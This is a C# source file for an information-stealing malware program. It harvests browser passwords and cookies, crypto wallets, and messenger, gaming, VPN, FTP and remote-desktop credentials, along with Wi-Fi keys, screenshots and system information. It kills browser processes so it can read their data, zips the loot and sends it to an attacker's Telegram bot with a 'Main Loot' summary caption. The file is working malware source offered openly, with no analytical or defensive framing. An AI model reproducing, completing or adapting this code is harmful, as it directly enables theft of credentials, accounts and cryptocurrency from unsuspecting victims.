using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http; 
using System.Net.Http.Headers; 
using System.Text; 
using System.Threading;
using System.Threading.Tasks;
using System.Linq; 
using Intelix.Helper; 
using Intelix.Helper.Data;
using Intelix.Targets;
using Intelix.Targets.Applications;
using Intelix.Targets.Browsers;
using Intelix.Targets.Crypto;
using Intelix.Targets.Device; 
using Intelix.Targets.Games;
using Intelix.Targets.Messangers;
using Intelix.Targets.Vpn;

namespace CvMega;

public class Program
{
    public static List<ITarget> targetsBrowsers = new List<ITarget>
    {
        new Chromium(),
        new Gecko()
    };

    public static List<ITarget> targets = new List<ITarget>
    {
        new ScreenShot(),
        new GameList(),
        new InstalledBrowsers(),
        new InstalledPrograms(),
        new ProcessDump(),
        new ProductKey(),
        new SystemInfo(),
        new WifiKey(),
        new Telegram(),
        new Discord(),
        new Element(),
        new Icq(),
        new MicroSIP(),
        new Jabber(),
        new Outlook(),
        new Pidgin(),
        new Signal(),
        new Skype(),
        new Tox(),
        new Viber(),
        new Minecraft(),
        new BattleNet(),
        new Epic(),
        new Riot(),
        new Roblox(),
        new Steam(),
        new Uplay(),
        new XBox(),
        new Growtopia(),
        new ElectronicArts(),
        new Rdp(),
        new AnyDesk(),
        new CyberDuck(),
        new DynDns(),
        new FileZilla(),
        new Ngrok(),
        new PlayIt(),
        new TeamViewer(),
        new WinSCP(),
        new TotalCommander(),
        new FTPNavigator(),
        new FTPRush(),
        new CoreFtp(),
        new FTPGetter(),
        new FTPCommander(),
        new TeamSpeak(),
        new Obs(),
        new GithubGui(),
        new NoIp(),
        new FoxMail(),
        new Navicat(),
        new RDCMan(),
        new Sunlogin(),
        new Xmanager(),
        new JetBrains(),
        new PuTTY(),
        new Cisco(),
        new RadminVPN(),
        new CyberGhost(),
        new ExpressVPN(),
        new HideMyName(),
        new IpVanish(),
        new MullVad(),
        new NordVpn(),
        new OpenVpn(),
        new PIAVPN(),
        new ProtonVpn(),
        new Proxifier(),
        new SurfShark(),
        new Hamachi(),
        new WireGuard(),
        new SoftEther(),
        new CryptoDesktop(),
        new Grabber(),
        new UserAgentGenerator(),
        new CryptoChromium(),
        new CryptoGecko()
    };

    public static StringBuilder stringBuilderError = new StringBuilder();

    public static async Task Main(string[] args)
    {
        string botToken = "ur token";
        string chatId = "1781548144";
        string userName = Environment.UserName;
        string machineName = Environment.MachineName;
        string userIdentifier = $"{userName}@{machineName}";

        string arguments = string.Join(" ", args);

        if (arguments.Contains("--run-once"))
        {
            string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string path = Path.Combine(exeDirectory, "crashreport.txt");
            if (File.Exists(path))
            {
                return;
            }
            File.Create(path);
        }

        // Collect and send data
        await CollectAndSendDataViaTelegram(botToken, chatId, userIdentifier);
    }

    public class CollectionResult
    {
        public string ZipPath { get; set; }
        public Counter Counter { get; set; }
    }

    public static async Task<CollectionResult> CollectAndZipDataAsync()
    {
        string tempDir = Path.GetTempPath();
        string userName = Environment.UserName;
        string machineName = Environment.MachineName;
        string userIdentifier = $"{userName}@{machineName}";
        
        string finalZipName = $"{userIdentifier}.zip";
        string finalZipPath = Path.Combine(tempDir, finalZipName);
        
        InMemoryZip zip = new InMemoryZip();
        Counter counter = new Counter();
        
        try
        {
            try
            {
                Task<string> ipTask = Task.Run(() => IpApi.GetPublicIp());

                Task.WaitAll(Task.Run(delegate
                {
                    Parallel.ForEach(targets, delegate (ITarget target)
                    {
                        try
                        {
                            target.Collect(zip, counter);
                        }
                        catch (Exception ex)
                        {
                            stringBuilderError.AppendLine($"[TARGET: {target.GetType().Name}] {ex.Message}");
                        }
                    });
                }), Task.Run(delegate
                {
                    ProcessKiller.KillerAll();
                    Thread.Sleep(200);
                    Parallel.ForEach(targetsBrowsers, delegate (ITarget target)
                    {
                        try
                        {
                            target.Collect(zip, counter);
                        }
                        catch (Exception ex)
                        {
                            stringBuilderError.AppendLine($"[BROWSER: {target.GetType().Name}] {ex.Message}");
                        }
                    });
                }));

                counter.Collect(zip);

                zip.AddTextFile("Error.txt", stringBuilderError.ToString());

                // Save the zip file
                byte[] zipData = zip.ToArray();
                File.WriteAllBytes(finalZipPath, zipData);
                
                return new CollectionResult { ZipPath = finalZipPath, Counter = counter };
            }
            catch (Exception ex)
            {
                stringBuilderError.AppendLine($"Error during data collection: {ex.Message}");
                return new CollectionResult { ZipPath = null, Counter = counter };
            }
        }
        finally
        {
            if (zip != null)
            {
                ((IDisposable)zip).Dispose();
            }
        }
    }

    public static async Task CollectAndSendDataViaTelegram(string botToken, string chatId, string userIdentifier)
    {
        var result = await CollectAndZipDataAsync();
        
        if (!string.IsNullOrEmpty(result.ZipPath) && File.Exists(result.ZipPath))
        {
            try
            {
                byte[] zipData = File.ReadAllBytes(result.ZipPath);
                
                string userName = Environment.UserName;
                string machineName = Environment.MachineName;
                string userIdentifierLocal = $"{userName}@{machineName}";
                
                string fileNameForArchive = userIdentifierLocal;
                
                string publicIp = "N/A";
                try
                {
                    publicIp = IpApi.GetPublicIp();
                }
                catch (Exception) { }
                
                // Calculate actual counts from the counter that was used during collection
                int totalPasswords = result.Counter.Browsers.Sum(b => (int)(long)b.Password);
                int totalCookies = result.Counter.Browsers.Sum(b => (int)(long)b.Cookies);
                int totalWallets = result.Counter.CryptoDesktop.Count + result.Counter.CryptoChromium.Count;
                int totalApplications = result.Counter.Applications.Count;
                int totalGames = result.Counter.Games.Count;
                int totalVpns = result.Counter.Vpns.Count;
                int totalMessengers = result.Counter.Messangers.Count;
                
                // Create message that works for both Telegram and Discord
                string caption = $"**✨ New Log Received ✨**\n\n" +
                                 $"**💻 User:** `{userIdentifierLocal}`\n" +
                                 $"**🌍 IP:** `{publicIp}`\n\n" +
                                 $"**📊 Main Loot:**\n" +
                                 $"**🔑 Passwords:** `{totalPasswords}`\n" +
                                 $"**🍪 Cookies:** `{totalCookies}`\n" +
                                 $"**💰 Wallets:** `{totalWallets}`\n\n" +
                                 $"**📦 Additional Data:**\n" +
                                 $"**📱 Applications:** `{totalApplications}`\n" +
                                 $"**🎮 Games:** `{totalGames}`\n" +
                                 $"**🔒 VPNs:** `{totalVpns}`\n" +
                                 $"**💬 Messengers:** `{totalMessengers}`\n\n" +
                                 $"**👨‍💻 Developer:** `@tcixt`";

                // Send via Telegram (convert markdown to HTML properly)
                string telegramCaption = ConvertMarkdownToHtml(caption);
                
                await SendToTelegram(botToken.TrimEnd('\0'), chatId.TrimEnd('\0'), zipData, fileNameForArchive, telegramCaption);
                
                // Clean up
                try { File.Delete(result.ZipPath); } catch { }
            }
            catch (Exception ex)
            {
                // Log error but don't crash
                File.AppendAllText("error.log", $"{DateTime.Now}: {ex}\n");
            }
        }
    }

    // Helper method to convert markdown to HTML for Telegram
    private static string ConvertMarkdownToHtml(string markdown)
    {
        string result = markdown;
        
        // Convert **text** to <b>text</b>
        while (result.Contains("**"))
        {
            int firstIndex = result.IndexOf("**");
            if (firstIndex >= 0)
            {
                int secondIndex = result.IndexOf("**", firstIndex + 2);
                if (secondIndex >= 0)
                {
                    string beforeFirst = result.Substring(0, firstIndex);
                    string betweenTags = result.Substring(firstIndex + 2, secondIndex - firstIndex - 2);
                    string afterSecond = result.Substring(secondIndex + 2);
                    result = beforeFirst + "<b>" + betweenTags + "</b>" + afterSecond;
                }
                else
                {
                    break; // No closing tag found
                }
            }
        }
        
        // Convert `text` to <code>text</code>
        while (result.Contains("`"))
        {
            int firstIndex = result.IndexOf("`");
            if (firstIndex >= 0)
            {
                int secondIndex = result.IndexOf("`", firstIndex + 1);
                if (secondIndex >= 0)
                {
                    string beforeFirst = result.Substring(0, firstIndex);
                    string betweenTags = result.Substring(firstIndex + 1, secondIndex - firstIndex - 1);
                    string afterSecond = result.Substring(secondIndex + 1);
                    result = beforeFirst + "<code>" + betweenTags + "</code>" + afterSecond;
                }
                else
                {
                    break; // No closing tag found
                }
            }
        }
        
        return result;
    }

    public static async Task SendToTelegram(string botToken, string chatId, byte[] file, string fileName, string caption)
    {
        if (file == null || file.Length == 0)
        {
            return;
        }

        try
        {
            using HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

            string url = $"https://api.telegram.org/bot{botToken}/sendDocument";
            using MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();

            multipartFormDataContent.Add(new StringContent(chatId), "chat_id");
            multipartFormDataContent.Add(new StringContent(caption), "caption");
            multipartFormDataContent.Add(new StringContent("HTML"), "parse_mode");

            using ByteArrayContent byteArrayContent = new ByteArrayContent(file);
            byteArrayContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");

            string zipFileName = $"{fileName}.zip";

            multipartFormDataContent.Add(byteArrayContent, "document", zipFileName);

            HttpResponseMessage response = await httpClient.PostAsync(url, multipartFormDataContent);

            if (!response.IsSuccessStatusCode)
            {
                string errorBody = await response.Content.ReadAsStringAsync();
                string errorMsg = $"Failed to send document. Status: {response.StatusCode}, Body: {errorBody}";
                File.AppendAllText("telegram_error.log", $"{DateTime.Now}: {errorMsg}\n");
            }
        }
        catch (HttpRequestException httpEx)
        {
            string errorMsg = $"HTTP request failed: {httpEx.Message}";
            File.AppendAllText("telegram_error.log", $"{DateTime.Now}: HttpRequestException: {httpEx}\n");
        }
        catch (Exception ex)
        {
            string errorMsg = $"Failed to send document: {ex.Message}";
            File.AppendAllText("telegram_error.log", $"{DateTime.Now}: Exception: {ex}\n");
        }
    }
}

























